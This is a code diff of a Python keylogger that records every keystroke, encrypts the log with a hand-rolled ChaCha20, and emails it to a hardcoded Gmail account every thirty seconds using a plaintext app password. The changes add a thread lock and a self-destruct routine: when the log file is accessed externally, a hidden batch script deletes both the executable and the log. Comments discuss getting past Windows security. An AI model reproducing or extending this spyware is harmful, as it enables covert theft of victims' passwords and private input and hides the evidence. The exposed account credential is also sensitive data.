@@ -1,5 +1,5 @@
 from pynput import keyboard
-import os, sys, time, subprocess
+import os, sys, time, subprocess, threading
 import psutil
 
 # key for ChaCha20
@@ -15,6 +15,7 @@ key = [
 ]
 block = 0
 keys = ""
+file_lock = threading.Lock()
 
 def generate_nonce():
     nonce_bytes = os.urandom(12)
@@ -26,15 +27,26 @@ def generate_nonce():
 
 nonce = generate_nonce()
 
+
+def get_file_access_time(path):
+    try:
+        return os.stat(path).st_atime
+    except FileNotFoundError:
+        return None
+
+last_access_time = get_file_access_time("log.txt")
+
 def delete_self():
     path_exe = os.path.realpath(sys.argv[0])  # get absolute path to exe file
     bat = path_exe + ".bat"                   # make a bat file next to exe file
+    log_path = os.path.join(os.path.dirname(path_exe), "log.txt")  
 
     bat_contents = f"""
         @echo off
         :loop
         del "{path_exe}" >nul 2>&1
         if exist "{path_exe}" goto loop
+        del "{log_path}" >nul 2>&1
         del "{bat}" >nul 2>&1
     """
 
@@ -44,7 +56,7 @@ def delete_self():
     subprocess.Popen([bat], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
 
 def on_press(key):
-    global keys, block
+    global keys, block, last_access_time
     # if key == keyboard.Key.esc:
     #     return False
     
@@ -67,57 +79,51 @@ def on_press(key):
         else:
             keys += f"[{key.name}]"
 
-    if not os.path.exists(path) or os.path.getsize(path) == 0:
-        with open(path, "wb") as f:
-            for word in nonce:
-                f.write(word.to_bytes(4, 'big'))
+    with file_lock:
+        if not os.path.exists(path) or os.path.getsize(path) == 0:
+            with open(path, "wb") as f:
+                for word in nonce:
+                    f.write(word.to_bytes(4, 'big'))
 
-    if len(keys) >= 64:
-        ascii_bytes = keys.encode("ascii", errors="ignore")
-        plaintext = ascii_bytes[:64]
+        last_access_time = get_file_access_time("log.txt") 
 
-        keystream = ChaCha20(nonce)[:64]
-        encrypted = bytes([p ^ k for p, k in zip(plaintext, keystream)])
+        if len(keys) >= 64:
+            ascii_bytes = keys.encode("ascii", errors="ignore")
+            plaintext = ascii_bytes[:64]
 
-        with open("log.txt", "ab") as f:  # append mode
-            f.write(encrypted)
+            keystream = ChaCha20(nonce)[:64]
+            encrypted = bytes([p ^ k for p, k in zip(plaintext, keystream)])
 
-        keys = ascii_bytes[64:].decode("ascii", errors="ignore")
-        block += 1
+            with open("log.txt", "ab") as f:  # append mode
+                f.write(encrypted)
 
+            keys = ascii_bytes[64:].decode("ascii", errors="ignore")
+            block += 1
 
-    # with open(path, "a") as file:
-    #     try:
-    #         file.write(f"{key.char}")
-    #     except AttributeError:
-    #         if key.name == "enter":
-    #             file.write("\n")
-    #         elif key.name == "space":
-    #             file.write(" ")
-    #         else:
-    #             file.write(f"[{key.name}]")
+        last_access_time = get_file_access_time("log.txt")
 
 # windows security immediately deletes exe if can send email.
 # to send email, needs 2fa with phone number and uses app passwords 
 # (this is a vulnerability in my code as the phone number could be tracked down)
 import yagmail
 def send_email():
-    global nonce
+    global nonce, last_access_time
     # dont send email if file is small
-    try:
-        if os.path.getsize("log.txt") < 256:
+    with file_lock:
+        try:
+            if os.path.getsize("log.txt") < 256:
+                return
+        except:
             return
-    except:
-        return
-    
-    
-    yag = yagmail.SMTP('xanofoxewa20@gmail.com', 'bvez hsnw ptsr isdd ')
-    yag.send('example_email@gmail.com', 'Subject', attachments = "log.txt")
+        
+        yag = yagmail.SMTP('xanofoxewa20@gmail.com', 'bvez hsnw ptsr isdd ')
+        yag.send('example_email@gmail.com', 'Subject', attachments = "log.txt")
 
-    # clears file
-    nonce = generate_nonce()
-    with open("log.txt", "w") as file:
-        pass
+        # clears file
+        nonce = generate_nonce()
+        with open("log.txt", "w") as file:
+            pass
+        last_access_time = get_file_access_time("log.txt")
 
 # ChaCha20 implementation in python
 # Based on this implementation of ChaCha20 in javascript: 
@@ -224,15 +230,36 @@ def ChaCha20(nonce):
 listener = keyboard.Listener(on_press=on_press)
 listener.start()
 
-directory_path = os.path.dirname(sys.executable)
+# directory_path = os.path.dirname(sys.executable)
 
 i = 0
-while (1):
+while True:
     time.sleep(1)
     i += 1
+
+    with file_lock:
+        current_access_time = get_file_access_time("log.txt")
+
+    if current_access_time and last_access_time and current_access_time != last_access_time:
+        # print(last_access_time)
+        # print(current_access_time)
+        # print("[!] Log file was accessed externally.")
+        # last_access_time = current_access_time
+        delete_self()
+        break
+
     if i > 30:
         i = 0
         send_email()
         time.sleep(10)
+
+# i = 0
+# while (1):
+#     time.sleep(1)
+#     i += 1
+#     if i > 30:
+#         i = 0
+#         send_email()
+#         time.sleep(10)
 
 listener.stop()
